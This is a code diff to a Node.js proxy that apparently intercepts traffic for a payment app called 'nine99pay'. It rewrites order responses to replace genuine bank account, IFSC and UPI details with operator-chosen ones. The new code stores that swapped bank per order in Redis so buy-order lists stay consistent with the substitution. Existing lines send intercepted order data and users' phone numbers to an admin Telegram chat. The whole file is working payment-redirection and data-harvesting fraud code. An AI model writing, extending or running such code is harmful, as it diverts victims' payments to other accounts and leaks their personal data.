@@ -102,6 +102,33 @@ function getTokenFromReq(req) {
   return headers['authorization'] || headers['token'] || '';
 }
 
+const orderBankCache = {};
+
+async function saveOrderBank(orderId, bank) {
+  if (!orderId || !bank || orderId === 'N/A') return;
+  const key = String(orderId);
+  const bankData = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc, bankName: bank.bankName || '', upiId: bank.upiId || '' };
+  orderBankCache[key] = bankData;
+  if (redis) redis.hset('nine99payOrderBankMap', key, JSON.stringify(bankData)).catch(()=>{});
+}
+
+async function getOrderBank(orderId) {
+  if (!orderId) return null;
+  const key = String(orderId);
+  if (orderBankCache[key]) return orderBankCache[key];
+  if (redis) {
+    try {
+      const stored = await redis.hget('nine99payOrderBankMap', key);
+      if (stored) {
+        const parsed = typeof stored === 'string' ? JSON.parse(stored) : stored;
+        orderBankCache[key] = parsed;
+        return parsed;
+      }
+    } catch(e) {}
+  }
+  return null;
+}
+
 function saveTokenUserId(req, userId) {
   if (!userId) return;
   const tok = getTokenFromReq(req);
@@ -1093,18 +1120,24 @@ async function proxyAndReplaceBankDetails(req, res, label) {
       bot.sendMessage(data.adminChatId, `🔍 DEBUG ${req.originalUrl}\n\n${dump}`).catch(()=>{});
     }
 
+    const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
+    const orderId = rd.orderId || rd.orderNo || rd.buyOrderId || rd.buyOrderNo || req.parsedBody?.orderId || req.parsedBody?.buyOrderNo || 'N/A';
+
     if (respData && active) {
+      const savedBank = await getOrderBank(orderId);
+      const bankToUse = savedBank || active;
       if (Array.isArray(respData)) {
-        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
+        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bankToUse, {}, 0); });
       } else {
         const originalValues = {};
-        deepReplace(respData, active, originalValues, 0);
+        deepReplace(respData, bankToUse, originalValues, 0);
+      }
+      if (!savedBank && orderId !== 'N/A') {
+        saveOrderBank(orderId, active);
       }
     }
 
     if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
-      const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
-      const orderId = rd.orderId || rd.orderNo || rd.buyOrderId || req.parsedBody?.orderId || 'N/A';
       const amount = rd.amount || rd.orderAmount || rd.buyAmount || req.parsedBody?.amount || 'N/A';
       const phone = getPhone(data, detectedUserId);
       bot.sendMessage(data.adminChatId,
@@ -1128,6 +1161,15 @@ Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
     console.error('Proxy+replace error:', req.originalUrl, e.message);
     if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
   }
+}
+
+const COMPLETED_ORDER_STATUSES = ['success', 'cancel', 'cancelled', 'completed', 'done', 'failed', 'expired', 'refunded', 'rejected'];
+
+function isActiveOrder(item) {
+  const status = String(item.orderStatus || item.status || '').toLowerCase();
+  if (COMPLETED_ORDER_STATUSES.includes(status)) return false;
+  if (/success|cancel|complet|done|fail|expir|refund|reject/i.test(status)) return false;
+  return true;
 }
 
 async function proxyAndReplaceBankInList(req, res) {
@@ -1165,6 +1207,46 @@ async function proxyAndReplaceBankInList(req, res) {
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) {
     console.error('List replace error:', req.originalUrl, e.message);
+    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
+  }
+}
+
+async function proxyAndReplaceBankInActiveOrders(req, res) {
+  const data = await loadData();
+
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const detectedUserId = await extractUserId(req, jsonResp);
+    if (detectedUserId) saveTokenUserId(req, detectedUserId);
+
+    const listData = getResponseData(jsonResp);
+    if (listData) {
+      const applyToItem = async (item) => {
+        const itemOrderId = item.orderId || item.orderNo || item.buyOrderId || item.buyOrderNo || item.id || '';
+        const savedBank = await getOrderBank(itemOrderId);
+        if (savedBank) {
+          const origVals = {};
+          deepReplace(item, savedBank, origVals, 0);
+        }
+      };
+      let items = [];
+      if (Array.isArray(listData)) {
+        items = listData;
+      } else if (listData.list && Array.isArray(listData.list)) {
+        items = listData.list;
+      } else if (listData.records && Array.isArray(listData.records)) {
+        items = listData.records;
+      } else if (listData.rows && Array.isArray(listData.rows)) {
+        items = listData.rows;
+      } else {
+        items = [listData];
+      }
+      await Promise.all(items.map(item => applyToItem(item)));
+    }
+
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) {
+    console.error('Active list replace error:', req.originalUrl, e.message);
     if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
   }
 }
@@ -1289,11 +1371,11 @@ app.all('/app/buy/order/simpleUserBank', async (req, res) => {
 });
 
 app.all('/app/buy/order/listBuyOrders', async (req, res) => {
-  await proxyAndReplaceBankInList(req, res);
+  await proxyAndReplaceBankInActiveOrders(req, res);
 });
 
 app.all('/app/buy/order/listUserBuyOrders', async (req, res) => {
-  await proxyAndReplaceBankInList(req, res);
+  await proxyAndReplaceBankInActiveOrders(req, res);
 });
 
 app.all('/app/sell/order/listUserSellOrders', async (req, res) => {
